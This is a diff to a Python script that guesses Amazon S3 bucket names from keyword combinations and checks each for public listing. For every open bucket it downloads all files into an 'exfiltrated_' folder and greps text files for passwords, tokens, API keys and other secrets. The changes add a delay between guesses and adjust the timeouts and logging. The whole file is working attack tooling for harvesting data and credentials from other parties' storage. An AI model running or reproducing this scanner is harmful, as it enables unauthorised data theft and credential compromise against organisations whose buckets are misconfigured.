@@ -1,4 +1,5 @@
 import os
+import time
 import requests
 import itertools
 import xml.etree.ElementTree as XmlElementTree
@@ -26,17 +27,18 @@ def GenerateBucketCombos(aKeywords: list[str]) -> list[str]:
             strJoinedUnderscore = '_'.join(aCombo)
             strJoinedPlain = ''.join(aCombo)
             aCombinations.extend([strJoinedDash, strJoinedUnderscore, strJoinedPlain])
-    return list(set(aCombinations))  # Deduplicate
+    return list(set(aCombinations))
 
 def CheckIfBucketIsPublic(strBucketName: str) -> tuple[bool, str]:
     strBucketURL = f"http://{strBucketName}.s3.amazonaws.com/"
+    print(f"[INFO] {strBucketName}")
     try:
-        objResponse = requests.get(strBucketURL, timeout=5)
+        objResponse = requests.get(strBucketURL, timeout=(2, 5))
         bIsPublic = (objResponse.status_code == 200)
         strResponseText = objResponse.text
         return bIsPublic, strResponseText
     except Exception as e:
-        print(f"[ERROR] Request failed for {strBucketName}: {str(e)}")
+        print(f"[ERROR] {strBucketName} error: {str(e)}")
         return False, ""
 
 def ParseS3FileKeys(strXMLResponse: str) -> list[str]:
@@ -54,7 +56,6 @@ def ScanTextFileForSecrets(strFilePath: str, strOutputDir: str) -> None:
     aKeywords = ["password", "passwd", "secret", "key", "api", "token", "db", "auth"]
     strOutFilePath = os.path.join(strOutputDir, "relevant_lines.txt")
     aMatchedLines = []
-
     try:
         with open(strFilePath, 'r', encoding='utf-8', errors='ignore') as fInputFile:
             for strLine in fInputFile:
@@ -73,56 +74,46 @@ def DownloadS3Object(strBucketName: str, strKey: str, strOutputDir: str) -> None
     strFileURL = f"https://{strBucketName}.s3.amazonaws.com/{strKey}"
     strSanitizedFileName = strKey.replace('/', '_')
     strOutputPath = os.path.join(strOutputDir, strSanitizedFileName)
-
     objResponse = requests.get(strFileURL)
     if objResponse.status_code == 200:
         with open(strOutputPath, 'wb') as fOutputFile:
             fOutputFile.write(objResponse.content)
         print(f"[INFO] Downloaded: {strKey} -> {strOutputPath}")
-
         if strOutputPath.lower().endswith(".txt"):
             ScanTextFileForSecrets(strOutputPath, strOutputDir)
     else:
         print(f"[ERROR] Failed to download {strKey} (HTTP {objResponse.status_code})")
 
 def AttemptExfilFromBucket(strBucketName: str) -> None:
-    print(f"[INFO] {strBucketName}")
     bIsPublic, strXMLListing = CheckIfBucketIsPublic(strBucketName)
-
     if not bIsPublic:
         print(f"[ERROR] '{strBucketName}' is not publicly listable or does not exist.")
         return
-
     print(f"[FOUND] '{strBucketName}' is PUBLIC. Proceeding to exfiltrate files...")
     aFileKeys = ParseS3FileKeys(strXMLListing)
     if not aFileKeys:
         print("[INFO] No files found or listing disabled.")
         return
-
     strOutputDir = f"exfiltrated_{strBucketName}"
     os.makedirs(strOutputDir, exist_ok=True)
-
     for strFileKey in aFileKeys:
         print(f"[FOUND] {strFileKey} is public")
         DownloadS3Object(strBucketName, strFileKey, strOutputDir)
-
     print(f"[INFO] Exfiltration complete. Files saved in: {strOutputDir}")
 
 def Main() -> None:
     strMode = PromptForMode()
-
     if strMode == "1":
         strBucketName = PromptForBucketName()
         AttemptExfilFromBucket(strBucketName)
-
     elif strMode == "2":
         aKeywords = PromptForKeywords()
+        nDelaySec = int(input("Enter delay between attempts (in seconds, e.g., 5): ").strip())
         aBucketCombos = GenerateBucketCombos(aKeywords)
         print(f"[INFO] Trying {len(aBucketCombos)} bucket combinations...")
-
         for strBucketName in aBucketCombos:
             AttemptExfilFromBucket(strBucketName)
-
+            time.sleep(nDelaySec)
     else:
         print("[ERROR] Invalid choice.")
 
